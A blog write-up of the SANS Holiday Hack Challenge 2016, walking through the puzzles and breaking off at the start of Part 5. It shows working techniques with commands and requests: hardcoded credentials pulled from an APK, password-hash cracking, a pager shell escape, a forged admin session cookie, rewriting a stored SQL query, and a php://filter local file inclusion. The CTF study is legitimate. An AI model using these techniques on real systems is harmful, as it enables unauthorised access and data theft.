---
layout: post
title: "SANS Holiday Hack Challenge 2016"
category: Security
date: 2017-01-05
tags:
  - Security
  - CTF
  - Wargames
  - SANS
---

{:toc}

## Introduction

This is my second time playing the SANS holiday hack challenge.  It was a lot of fun, and probably took me about 8-10 hours over a period of 2-3 days, **not** including this writeup.  Ironically, this writeup took me longer than actually completing the challenge -- which brings me to a note about some of the examples in the writeup.  Please ignore any dates or timelines you might see in screengrabs and other notes -- I was so engrossed in **playing** that I did a terrible job of documenting as I went along, so a lot of these I went back and did a 2nd time (of course, knowing the solution made it a bit easier) so I could provide the quality of writeup I was hoping to.

Most importantly, a huge shout out to all the SANS Counter Hack guys -- I can only imagine how much work goes into building an educational game like this and making the challenges realistic and engrossing.  I’ve built wargames & similar apps for work, but never had to build them into a story -- let across a story that spans multiple years.  I tip my hat to their dedication and success!

<!--more-->

## Part 1: A Most Curious Business Card

We start with the Dosis children again (I can’t read that name without thinking about DOCSIS, but I see no cable modems here…) who have found Santa’s bag and business card, signs of a struggle, but no Santa!

![](/img/blog/hhc2016/image_0.png)

Looking at the business card, we see that Santa seems to be into extensive social media use.  On his twitter account, we see a large number of posts (350), mostly composed of Christmas-themed words (JOY, PEACEONEARTH, etc.), but occasionally with a number of symbols in the center.  At first I thought it might be some kind of encoding, so I decided to download the tweets to a file and examine them as plaintext.  I did this with a bit of javascript to pull the right elements into a single file.  I was about to start trying various decoding techniques when I happened to notice a pattern:

![](/img/blog/hhc2016/image_1.png)

Well, perhaps the hidden message is "BUG BOUNTY".  (Question #1)  (Image wrapped for readability.)  I’m not sure what to do with it at this point, but perhaps it will become clear later.

Let’s switch to instagram and take a look there.  The first two photos appear unremarkable, but the third one is cluttered with potential clues.  One of Santa’s elves (Hermey) is apparently as good at keeping a clean desk as I am -- just ask my coworkers!  Fortunately they don’t Instagram shame me.  :)

![](/img/blog/hhc2016/image_2.jpg)

Using our "enhance" button from the local crime-solving TV show, we find a couple of clues.![](/img/blog/hhc2016/image_3.png)![](/img/blog/hhc2016/image_4.png)

We have a domain (or at least part of one) from an nmap report, and a filename.  I wonder if they go together: [https://www.northpolewonderland.com/SantaGram_4.2.zip](https://www.northpolewonderland.com/SantaGram_4.2.zip).  Indeed they do, and we have a zip file.  Unzipping it, we discover it’s encrypted.  Unsure what else to try, I try variations of "BUG BOUNTY" from Twitter, and it works for me.  (Turns out the password is lower case, though.)  Inside the zip file, we find an APK for SantaGram with SHA-1 78f950e8553765d4ccb39c30df7c437ac651d0d3.  (Question #2)

## Part 2: Awesome Package Konveyance

With APK in hand, we decide to start hunting for interesting artifacts inside.  With a simple `apktool d`, we extract all the files inside, resulting in resources, smali code, and a handful of other files.  Hunting for usernames and passwords, I decide to use ack (http://beyondgrep.com/), a grep-like tool with some enhanced features.  A quick search with the strings username and password reveal a number of potential options.  I could check manually, but well, I’m lazy.  Instead, I use `ack -A 5`, which shows 5 lines of context after each match.  Paging through these results, I spot a likely candidate:

![](/img/blog/hhc2016/image_5.png)

Inside this same smali file, I find a password a few lines further down:

~~~
:try_start_0
const-string v1, "username"
const-string v2, "guest"
invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
const-string v1, "password"
const-string v2, "busyreindeer78"
~~~

Now we have a username and password pair: `guest:busyreindeer78`. (Question #3)  Cool.  I don’t know what they’re good for, but collecting credentials can always come in handy later.

An audio file is mentioned.  I don’t know if it’s embedded in source, a resource by itself, or what, but I’m going to take a guess that it’s a large file.  Find is useful in these cases:

~~~
% find . -size +100k               
./smali/android/support/v7/widget/StaggeredGridLayoutManager.smali
./smali/android/support/v7/widget/ao.smali
./smali/android/support/v7/widget/Toolbar.smali
./smali/android/support/v7/widget/LinearLayoutManager.smali
./smali/android/support/v7/a/l.smali
./smali/android/support/v4/b/s.smali
./smali/android/support/v4/widget/NestedScrollView.smali
./smali/android/support/design/widget/CoordinatorLayout.smali
./smali/com/parse/ParseObject.smali
./res/drawable/launch_screen.png
./res/drawable/demo_img.jpg
./res/raw/discombobulatedaudio1.mp3
~~~

There are quite a few more files than I expected in the relevant size range, but it’s easy to find the MP3 file in the bunch with just a glance.  I guess the name of the audio file is `discombobulatedaudio1.mp3`.  (Question #4.)

## Part 3: A Fresh-Baked Holiday Pi

After running around for a while, hunting for pieces of the Cranberry Pi, I’m able to put the pieces together, and the helpful Holly Evergreen provides a link to the Cranberry Pi image.

![](/img/blog/hhc2016/image_6.png)

After downloading the image, I’m able to map the partitions (using a great tool named kpartx) and mount the filesystem, then extract the password hash.

~~~
% sudo kpartx -av ./cranbian-jessie.img
add map loop3p1 (254:7): 0 129024 linear 7:3 8192
add map loop3p2 (254:8): 0 2576384 linear 7:3 137216
% sudo mount /dev/mapper/loop3p2 data
% sudo grep cranpi data/etc/shadow
cranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::
~~~

This is a standard Unix sha-512 hash -- slow, but workable.  Fortunately, Minty Candycane of Rudolph’s Red Team has helped us out there by pointing to John the Ripper and the RockYou password list.  (Shout out to @iagox86 for hosting the best collection of password lists around.)

![](/img/blog/hhc2016/image_7.png)

Throwing the hash up on a virtual machine with a few cores and running john with the rockyou list for a little while, we discover Santa’s top secret password: `yummycookies`. (Question #5)  After we let Holly Evergreen know that we’ve found the password, she tells us that we’ll be able to use the terminals around the North Pole to unlock the doors.  Time to head to the terminals.

### Terminal: Elf House #2

![](/img/blog/hhc2016/image_8.png)

The first door I ran to is Elf house #2.  Opening the terminal, we’re told to find the password in the `/out.pcap` file, but we’re running as the user `scratchy`, and the user `itchy` owns the file.  After spending some time over-thinking the problem, I run `sudo -l `to see if I can run anything as root or itchy and discover some various useful tools:

~~~
(itchy) NOPASSWD: /usr/sbin/tcpdump
(itchy) NOPASSWD: /usr/bin/strings
~~~

Like any good hacker, I go straight to strings and discover the first part of the password:

~~~
sudo -u itchy /usr/bin/strings /out.pcap
…
<input type="hidden" name="part1" value="santasli" />
…
~~~

I played around with tcpdump to try to extract the second part as a file, but could never get anything I was able to reconstruct into anything meaningful.  I thought about trying to exfiltrate the file to my local box for wireshark, but I decided I wanted to push to solve it only with the tools I had available to me.  I look at my options with tcpdump and try the -A flag (giving ASCII output) to see what I can see.  Paging through it, I noticed an area where I saw the string "part2", but only in every-other character.  I gave strings another try, this time checking for little-endian UTF-16 characters:

~~~
sudo -u itchy /usr/bin/strings -e l /out.pcap
part2:ttlehelper
~~~

Putting the parts together, we have "santaslittlehelper" and we’re in!

### Terminal: Workshop

The first of two doors in the workshop is up the candy-cane striped stairs.

![](/img/blog/hhc2016/image_9.png)

The challenge here is simple, find the password in the deeply nested directory structure.  I decided to see what files existed at all with a quick find:

~~~
$ find . -type f
./.bashrc
./.doormat/. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
./.profile
./.bash_logout
~~~

That was easy, but I suppose we need the contents.  I don’t want to deal with all the special characters and directories (remember, I’m lazy) so I just let find do the work for me:

~~~
$ find . -type f -name 'key*' -exec cat {} \;
key: open_sesame
~~~

<!--*-->

This leads us into Santa’s office, which presents us with another terminal on the back wall.

### Terminal: Santa’s Office

As I said, we’re in Santa’s office with another terminal on the back wall, but no obvious door.  It turns out the bookcase there is the hidden door!

![](/img/blog/hhc2016/image_10.png)

Getting back to the terminal, I’m prompted with `GREETINGS PROFESSOR FALKEN`.  Immediately, I recognize this as a line from the WOPR in the movie WarGames.  After a few errant entries, I realize it wants me to dialog with it in exactly the same way as the movie.  (This was a painstaking exercise in transcribing YouTube.)

~~~
GREETINGS PROFESSOR FALKEN.
Hello.
HOW ARE YOU FEELING TODAY?
I'm fine. How are you?
EXCELLENT, IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6/23/73?
People sometimes make mistakes.
YES THEY DO. SHALL WE PLAY A GAME?
Love to. How about Global Thermonuclear War?
WOULDN'T YOU PREFER A GOOD GAME OF CHESS?
Later. Let's play Global Thermonuclear War.
FINE
,------~~v,_         _                     _--^\
 |'          \   ,__/ ||                 _/    /,_ _
/             \,/     /         ,,  _,,/^         v v-___
|                    /          |'~^                     \
\                   |         _/                     _ _/^
 \                 /         /                   ,~~^/ | 
  ^~~_       _ _   /          |          __,, _v__\   \/
      '~~,  , ~ \ \           ^~       /    ~   //
          \/     \/             \~,  ,/          
                                   ~~
   UNITED STATES                   SOVIET UNION
WHICH SIDE DO YOU WANT?
     1.    UNITED STATES
     2.    SOVIET UNION
PLEASE CHOOSE ONE: 2
AWAITING FIRST STRIKE COMMAND
-----------------------------
PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTRY NAME: 
Las Vegas
LAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE: 
LOOK AT THE PRETTY LIGHTS
~~~

That was painful, but not difficult.  It was incredibly unforgiving when it comes to typos, even a single space would require retyping the sentence (though fortunately not the whole transaction).

Through the door, we find ourselves in "The Corridor" with another locked door, but this time, no terminal.  I tried a few obvious passwords anyway, but had no luck with that.

### Terminal: Workshop (Reindeer)

There’s a second door in the workshop, next to a few of Santa’s reindeer.  (If anyone figures out whether reindeer really moo, please let me know…)

![](/img/blog/hhc2016/image_11.png)

`Find the passphrase from the wumpus.  Play fair or cheat; it's up to you. `

I was going to cheat, but first I wanted to get the lay of the game, so I wandered a bit and fired a few arrows, and happened to hit the wumpus -- no cheating necessary!  (I’m not sure if randomly playing is "playing fair", but hacking is about what works!)

~~~
Move or shoot? (m-s) s 6
*thwock!* *groan* *crash*
A horrible roar fills the cave, and you realize, with a smile, that you
have slain the evil Wumpus and won the game!  You don't want to tarry for
long, however, because not only is the Wumpus famous, but the stench of
dead Wumpus is also quite well known, a stench plenty enough to slay the
mightiest adventurer at a single whiff!!
Passphrase:
WUMPUS IS MISUNDERSTOOD
~~~

### Terminal: Workshop - Train Station

![](/img/blog/hhc2016/image_12.png)

On the train, there’s another terminal.  It proclaims to be the `Train Management Console: AUTHORIZED USERS ONLY`.  Running a few commands, I soon discovered that `BRAKEOFF` works, but `START` requires a password which I don’t have.  Looking at the `HELP` documentation, I noticed something odd:

~~~
Help Document for the Train
**STATUS** option will show you the current state of the train (brakes, boiler, boiler temp, coal level)
**BRAKEON** option enables the brakes.  Brakes should be enabled at every stop and while the train is not in use. 
**BRAKEOFF** option disables the brakes.  Brakes must be disabled before the **START** command will execute.
**START** option will start the train if the brake is released and the user has the correct password.
**HELP** brings you to this file.  If it's not here, this console cannot do it, unLESS you know something I don't.
~~~

It seemed strange that unLESS had the unusual capitalization, but then I realized the help document was probably being displayed with GNU less.  Did that have a shell functionality, similar to vim or editors?  The more-or-less universal command to start a shell is a bang (!), so I decided to give it a try, and was out into a shell.  At first I thought about looking for the password (and you can discover it), but then I realized I could just run `ActivateTrain` directly.

![](/img/blog/hhc2016/image_13.png)

It turns out the train is a time machine to 1978.  (I wonder if that’s related to the guest password we found earlier -- busyreindeer78.  Guess we’ll find out soon.)

### 1978: Finding Santa

So I arrived in 1978 and quite frankly, had no idea what I should do.  I still needed more NetWars challenge coins (man, what I wouldn’t give for a real-life NetWars challenge coin, but since I’ve never been to a NetWars event, my trophy case remains empty), so I decided to wander and find whatever I found.  Guess what I found?  Santa!  He was in the DFER (Dungeon for Errant Reindeer), but could not remember how he got there.

![](/img/blog/hhc2016/image_14.png)

## Part 4: My Gosh... It's Full of Holes

If we use ack again to find URLs containing "northpolewonderland.com" (which was just a bit of a guess from seeing one or two of these URLs when looking for credentails), we find a number of candidate URLs:

~~~
% ack -o "[a-z]+\.northpolewonderland\.com"
values/strings.xml
24:analytics.northpolewonderland.com
25:analytics.northpolewonderland.com
29:ads.northpolewonderland.com
32:dev.northpolewonderland.com
34:dungeon.northpolewonderland.com
35:ex.northpolewonderland.com
~~~

We can then retrieve the IP addresses for each of these hosts using our trust DNS tool `dig`:

~~~
% dig +short {ads,analytics,dev,dungeon,ex}.northpolewonderland.com
104.198.221.240
104.198.252.157
35.184.63.245
35.184.47.139
104.154.196.33
~~~

Taking each of these IPs to our trusty Tom Hessman, we find that each of these IPs in in scope for our testing, but are advised to keep our traffic reasonable.

![](/img/blog/hhc2016/image_15.png)

### analytics.northpolewonderland.com

I started by doing a quick NMAP scan of the host -- it’s good to know what’s running on a machine, and sometimes you can reveal some interesting info with the default set of scripts.  In fact, that turned out to be extremely handy in this particular case:

~~~
% nmap -F -sC analytics.northpolewonderland.com
Starting Nmap 7.31 ( https://nmap.org )
Nmap scan report for analytics.northpolewonderland.com (104.198.252.157)
Host is up (0.065s latency).
rDNS record for 104.198.252.157: 157.252.198.104.bc.googleusercontent.com
Not shown: 98 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)
|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)
|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)
443/tcp open  https
| http-git: 
|   104.198.252.157:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Finishing touches (style, css, etc) 
| http-title: Sprusage Usage Reporter!
|_Requested resource was login.php
| ssl-cert: Subject: commonName=analytics.northpolewonderland.com
| Subject Alternative Name: DNS:analytics.northpolewonderland.com
| Not valid before: 2016-12-07T17:35:00
|_Not valid after:  2017-03-07T17:35:00
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
~~~

You’ll notice that the nmap http-git script was successful in this case.  This is a not-uncommon finding when developers use git to deploy an application directly to the document root (very common in the case of PHP applications, which is likely the case here due to the redirect to ‘login.php’).  This is great, because we can download the entire git repository, which will allow us to look for secrets, credentials, hidden handlers, or at least better understand the application.

Now, it’s not possible to directly clone this over http because nobody ran `git update-server-info`, as they weren’t intending to share this over the network.  But that’s okay with directory indexing enabled: we can just mirror all the files with wget, then clone out a working repository:

~~~
% wget --mirror https://analytics.northpolewonderland.com/.git
…
Downloaded: 314 files, 1003K in 0.4s (2.68 MB/s)
% git clone analytics.northpolewonderland.com/.git analytics
Cloning into 'analytics'...
done.
~~~

Looking at the source, we find a few interesting files (given that we know an audio file is at least one of our goals): there’s a `getaudio.php` that returns a download of an mp3 file from the database (storing the whole MP3 in a database column isn’t the design choice I would have made, but I suppose I’ll be discovering a lot of design choices I wouldn’t have made).  It’s noteworthy that the only user it will allow to download a file is the user `guest`.  I decided to try logging in with the credentials we found in the app earlier (`guest:busyreindeer78`), and was straight in.  Conveniently, the top of the page has a link labeled "MP3", and a click later we have `discombobulatedaudio2.mp3`.

That was easy, but I have reason to believe we’re not done here -- if for no reason other than the fact that there are 2 references to the analytics server in the challenge description.  There’s also quite a bit of functionality we haven’t tried out yet.  I spent a few minutes reviewing the SQL queries in the application.  They’re not parameterized queries (again, differing design decisions) but the liberal use of `mysqli_real_escape_string` seems to prevent any obvious SQL injection.

One notable feature is the ability to save analytics reports.  It’s *particularly *notable that the way in which they are saved is by storing the final SQL query into a column in the reports table.  There’s also an ‘edit’ function for these saved queries, which seems to be design just for renaming the saved reports, but if we look at the code, we easily see that we can edit any column stored in the database, **including the stored SQL query.**  I’m honestly not sure what the right term is for this vulnerability (SQL injection implies injecting into an existing query, after all), but it’s clearly a vulnerability that will let us read arbitrary data from the database -- including the stored MP3s, assuming we can access the edit functionality.

Code allowing any column to be updated:

~~~
$row = mysqli_fetch_assoc($result);
# Update the row with the new values
$set = [];
foreach($row as $name => $value) {
  print "Checking for " . htmlentities($name) . "...<br>";
  if(isset($_GET[$name])) {
    print 'Yup!<br>';
    $set[] = "$name='".mysqli_real_escape_string($db, $_GET[$name])."'";
  }
}
~~~

This edit function is allegedly restricted to not allow any users access:

(edit.php)

~~~
# Don't allow anybody to access this page (yet!)
restrict_page_to_users($db, []);
~~~

However, if we investigate the `restrict_page_to_users` function, we find that it calls `check_access` from db.php, which contains this code:

(db.php)
 
~~~
function check_access($db, $username, $users) {
  # Allow administrator to access any page
  if($username == 'administrator') {
    return;
  }
~~~

We now know that there’s probably an "administrator" user and that getting to that will allow us to access the edit.php page.  Unfortunately, we don’t have credentials to log in as administrator, and we can’t use our arbitrary SQL to read the credentials until we have access.  Stuck in a Catch-22?  Not quite: who said we have to log in?

Earlier I foreshadowed the value of having access to the git repository for the site: session cookies are encrypted with symmetric crypto, and the key is available in the git repository:

`define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");`

This allows us to encrypt our own session cookie as administrator.  I hacked together a short script to create a new `AUTH` cookie:

~~~
<?PHP
include('crypto.php');
print encrypt(json_encode([
  'username' => 'administrator',
  'date' => date(DateTime::ISO8601),
]));
~~~

Using my favorite cookie-editing extension to update my cookie, I quickly discover that the edit functionality is now available.  Now, the edit page doesn’t provide an input field for the query, but thanks to Burp Suite, it’s easy enough to add my own parameter and edit the query.  Based on getaudio.mp3, I know the schema for the audio table, so I craft a query to get it.  Lacking an easy way to return the binary data directly (I can only execute this query within the context of an HTML page) I decide to return the MP3 encoded as a string.  Base64 would probably be ideal to minimize overhead, but the `TO_BASE64` function was added in 5.6 and I was too lazy to query the version from the database, so I encoded as hex instead.

I wanted the following query: ``SELECT  `id`,`username`,`filename`,hex(`mp3`) FROM audio``, so I POST’d to the following URL:

``https://analytics.northpolewonderland.com/edit.php?id=1147b606-4d2f-4faa-b771-a55e03307367&name=foo&description=bar&query=SELECT+`id`,`username`,`filename`,hex(`mp3`)+FROM+audio``

Then I ran the report with the saved report functionality, and extracted the hex and decoded it to reveal the other MP3 file.  Based on the filename stored in the report, I saved it to my audio directory with the name discombobulatedaudio7.mp3.  From the query results, we know these are the only 2 MP3s in the audio table, so it seems like it’s time to move on to the next server, but I decided to grab the passwords from the users table by updating the query again, just in case they might be useful later:

![](/img/blog/hhc2016/image_16.png)

### ads.northpolewonderland.com

The nmap results for this host were rather unremarkable: essentially, yes, it’s a webserver.  Visiting the full URL from the APK, the site returns directly an image file (no link?  I guess these banner ads are for brick-and-mortar stores), so navigating to the root, we find the administration site for the ad system.

Fortunately, I had happened upon a helpful elf who informed me about this "Meteor" javascript framework, and the MeteorMiner script for extracting information from Meteor.  Unfortunately, I had never seen Meteor before, so I had no idea what was going on.  After trying some braindead attempts to steal the credentials for an administrator (`Meteor.users.find().fetch()` returned nothing), I attempted to register a new account to see if I could get access to more interesting functionality that way, but was repeatedly rebuffed by the site:

![](/img/blog/hhc2016/image_17.png)

I began to look into how Meteor manages users, and guessed that they were using the default user management package.  According to the documentation, you could add users for testing by calling the `createUser` method:

`Accounts.createUser({password:'matirwuzhere', username:'matir'})`

It turns out that this worked to create a user, and even directly logged me in as that user.  Unfortunately, all of the pages still gave me a response of "You must be logged in to access this page".  I clicked around and generated dozens of requests and didn’t realize anything had meaningfully changed until I noticed that MeteorMiner was reporting a 5th member of the HomeQuote collection.  Examining the collection in the javascript console revealed my prize: the path to an audio file, `discombobulatedaudio5.mp3`:

![](/img/blog/hhc2016/image_18.png)

### dev.northpolewonderland.com

Nmap gets us nothing here: just HTTP and SSH open.  Visiting the webserver, we find nothing, literally.  Just a "200 OK" response with no content.  I can’t dirbuster (thanks Tom!), so how can I figure out what the web application might be doing?

Well, I have essentially two options: I can analyze the SantaGram APK, maybe use dex2jar and JAD (or another Java decompiler) to have semi-readable source, or maybe I can run the APK in an emulator and capture requests with Burp Suite.  For several reasons, I decide to go with the 2nd route, not the least of which is that I spend a lot of time in Burp during my day-to-day, so I’ll be using the tools I’m more familiar with.

So I fire up the Android emulator with the proxy set to my Burp instance, install SantaGram with adb, and start playing with the app.  It turns out this is another place that we can use the `guest:busyreindeer78` credentials to log in, but no matter what I do in the app, I can’t seem to see any requests for `dev.northpolewonderland.com`.  Looking at `res/values/strings.xml` from the APK, I see an important entry adjacent to the `dev.northpolewonderland.com` entry:

~~~
<string name="debug_data_collection_url">
    http://dev.northpolewonderland.com/index.php</string>
<string name="debug_data_enabled">false</string>
~~~

Well, I suppose it’s not sending requests to dev because `debug_data_enabled` is `false`.  Let’s change that to true and rebuild the APK:

~~~
% apktool b -o santagram_mod.apk santagram
% /tmp/apk-resigner/signapk.sh ./santagram_mod.apk
% adb install santagram_mod.apk
% adb uninstall com.northpolewonderland.santagram
% adb install signed_santagram_mod.apk
~~~

It turns out rebuilding the APK was more troublesome than I anticipated because it needed to be resigned, and then the resigned one couldn’t be installed because it used a different key than the existing one, so I needed to uninstall the HHC SantaGram and install mine.  (Clearly I need to do more mobile assessments.)

With the debug-enabled version installed, it was time to play with the app some more.  While debugging the lack of debug requests, I noticed several references to the debug code in the user profile editing class, so I decided to give that a try and noticed (finally!) requests to `dev.northpolewonderland.com`.

~~~
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)
Host: dev.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 144
{"date":"20161230120936-0800","udid":"71b4a03e1f1b4e1c","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":66806400}
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Fri, 30 Dec 2016 20:09:37 GMT
Content-Type: application/json
Connection: close
Content-Length: 250
{"date":"20161230200937","status":"OK","filename":"debug-20161230200937-0.txt","request":{"date":"20161230120936-0800","udid":"71b4a03e1f1b4e1c","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":66806400,"verbose":false}}
~~~

I noticed that the entire request is included in the response, plus a new field is added to the JSON: `"verbose":false`.  Can we include that in the request, and maybe switch it to true?  I send the request to Burp Repeater and add the verbose field, set to true:

~~~
POST /index.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)
Host: dev.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 159
{"date":"20161230120936-0800","udid":"71b4a03e1f1b4e1d","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":66806400,"verbose":true}
~~~

Unsurprisingly, the response changes, but we get way more than more details about our own debug message!

~~~
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Fri, 30 Dec 2016 23:01:56 GMT
Content-Type: application/json
Connection: close
Content-Length: 465
{"date":"20161230230156","date.len":14,"status":"OK","status.len":"2","filename":"debug-20161230230156-0.txt","filename.len":26,"request":{"date":"20161230120936-0800","udid":"71b4a03e1f1b4e1d","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":66806400,"verbose":true},"files":["debug-20161224235959-0.mp3","debug-20161230224818-0.txt","debug-20161230225810-0.txt","debug-20161230230155-0.txt","debug-20161230230156-0.txt","index.php"]}
~~~

You’ll notice we got a listing of all the files in the current directory (they must be cleaning that up periodically!), including an mp3 file.  Could this be the next discombobulatedaudioN.mp3?  I download the file and get something of approximately the right size, but it’s not clear which of the discombobulated files it will be.  All of the others had a filename in the discombobulated format (at least nearby, if not directly) so I set this one aside to be renamed later.

### dungeon.northpolewonderland.com

Initial nmap results for dungeon.northpolewonderland.com weren’t revealing anything too interesting.  Visting the webserver, I found what appears to be the help documentation for a Zork-style dungeon game. I remembered one of the elves offering up a copy of a game from a long time ago, so I went back and downloaded it.

I started playing the game briefly but, for as much as I love RPGs (I used to run several MUDs back in the 90s), I was impatient and wanted to get on with the Holiday Hack Challenge.  I started with the obvious: running `strings` both on the binary and the data file, but that gave very little headway.  I looked at Zork data file editors, but the first couple I found couldn’t decompile the provided data file (whether this is by accident, by design of the challenge, or because I picked the wrong tools, I have no idea), but that proved not to be useful.  However, on one of the sites where I was reading about reversing Zork games, I discovered a mention of a built-in debugger called GDT, or the Game Debugger Tool.  Among other things, GDT lets you dump all the information about NPCs, strings in the game, etc.  Much like I would use GNU strings to get oriented to an unknown binary, I decided to use the GDT strings dump to find all of the in-game strings.  Unfortunately, GDT required that I give it a string index and dump one at a time.  Not knowing how many strings there were, I picked 2048 for a starting point and did a little inline shell script to dump them.  I discovered that it starts to crash after about 1279, and the last handful seemed to be garbage (ok, no bounds checking, I wonder what else I could do?), so I decided to adjust my 2048 to 1200 and try again:

~~~
for i in seq 1 1200; do
    echo -n "$i: "
    echo -e "GDT\nDT\n$i\nEX\nquit\ny" | \
        ./dungeon 2>/dev/null | \
        tail -n +5 | \
        head -n -3
done
~~~

This produced a surprisingly readable strings table, except for some garbage at the end.  (It appears the correct number of strings is 1027 for this particular game file.)  At a quick glance, I notice some references to an "elf" near the end, while the rest of the seemed like pretty standard Zork gameplay.  Most interesting seemed to be this line:

~~~
1024: >GDT>Entry:    The elf, satisified with the trade says - 
Try the online version for the true prize
~~~

Well great, I need to find an online version, but I didn’t find a clue as to where it would be from the webpage with instructions, nor did the rest of the strings in the offline version offer a hint.  When in doubt -- more recon!  Time for a full NMAP scan (but I’ll leave scripts off in the interest of time):

~~~
Starting Nmap 7.31 ( https://nmap.org )
Nmap scan report for dungeon.northpolewonderland.com (35.184.47.139)
Host is up (0.066s latency).
rDNS record for 35.184.47.139: 139.47.184.35.bc.googleusercontent.com
Not shown: 64989 closed ports, 543 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
11111/tcp open  vce
Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
~~~

Aha!  Port 11111 is open.  I imagine netcat will give us an instance of the dungeon game.  My first question is whether the "Try the online version for the true prize" string says something different:

~~~
% nc dungeon.northpolewonderland.com 11111
Welcome to Dungeon.			This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
>GDT
GDT>DT
Entry:    1024
The elf, satisified with the trade says - 
send email to "peppermint@northpolewonderland.com" for that which you seek.
~~~

That was surprisingly easy -- I really expected to need to do more.  Maybe it’s misleading?  I send an email off to Peppermint and wait with anticipation for Santa’s elves to do their work.

It turns out it really was that easy!  Moments later, I have an email from Pepperment with an attachment: it’s `discombobulatedaudio3.mp3`!

### ex.northpolewonderland.com

One last server to go!  This server is apparently for handling uncaught exceptions from the application.  To figure out what kind of traffic it’s seeing, I decided to try to trigger an exception in the application running in the emulator (still going from my work on `dev.northpolewonderland.com`).  I actually stumbled upon this by mistake: if you change the device to be emulated to a Nexus 6, the application crashes and sends a crash report to `ex.northpolewonderland.com`.

~~~
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)
Host: ex.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 3860
{"operation":"WriteCrashDump","data":{...}}
~~~

I’ve omitted the contents of "data" in the interest of space, but it mostly contained the traceback of the exception that was thrown.  Interestingly, the response indicates that crashdumps are stored with a PHP extension, so my first thought was to try to include PHP code in the backtrace, but that never worked out (the code wasn’t being executed).  I’m assuming the PHP interpreter wasn’t turned on for that directory.

~~~
HTTP/1.1 200 OK
Server: nginx/1.10.2
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 81
{
	"success" : true,
	"folder" : "docs",
	"crashdump" : "crashdump-QKMuKk.php"
}
~~~

It turns out there’s also a ReadCrashDump operation that you can provide a crashdump name and it will return the contents.  You omit the php extension when sending the request, like so:

~~~
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)
Host: ex.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 69
{"operation":"ReadCrashDump","data":{"crashdump":"crashdump-QKMuKk"}}
~~~

 

Given that I confirmed the crashdumps are in a folder "docs" relative to exception.php, I tried reading the “crashdump” `../exception` to see if I could view the source, but that gives a 500 Internal Server Error.  (Likely it keeps loading itself in an `include()` loop.)  PHP, however, [provides some creative ways to read data, filtering it inline](https://secure.php.net/manual/en/stream.filters.php).  These pseudo-URLs for file opening result in different encodings and can be quite useful for bypassing LFI filters, non-printable characters for extracting binaries, etc.  I chose to use one that encodes a file as base64 to see if I could get the source of `exception.php`:

~~~
POST /exception.php HTTP/1.1
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)
Host: ex.northpolewonderland.com
Connection: close
Accept-Encoding: gzip
Content-Length: 109
{"operation":"ReadCrashDump","data":{"crashdump":"php://filter/convert.base64-encode/resource=../exception"}}
HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Sat, 31 Dec 2016 00:56:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 3168
PD9waHAgCgojIEF1ZGlvIGZpbGUgZnJvbSBEaXNjb21ib2J1bGF0b3IgaW4gd2Vicm9vdDog
…
oZHVtcFsnY3Jhc2hkdW1wJ10gLiAnLnBocCcpOwoJfQkKfQoKPz4K
~~~

The base64 encoded output is a great sign.  I decode it to discover, as expected, the contents of `exception.php`, which starts with this helpful hint:

~~~
<?php 
# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3
~~~

So, there we have our final piece of the discombobulated audio: `discombobulatedaudio6.mp3`.  This particular LFI was interesting for a few reasons: the use of `chdir()` to change directory instead of prepending the directory name, and the requirement that the file ends in `.php`.  Had they prepended the directory name, a filter could not have been used because the filter must be at the beginning of the string passed to the PHP file open functions (like `require`, `include`, `fopen`).

## Part 5: Discombobulated Audio

### Fixing the Audio

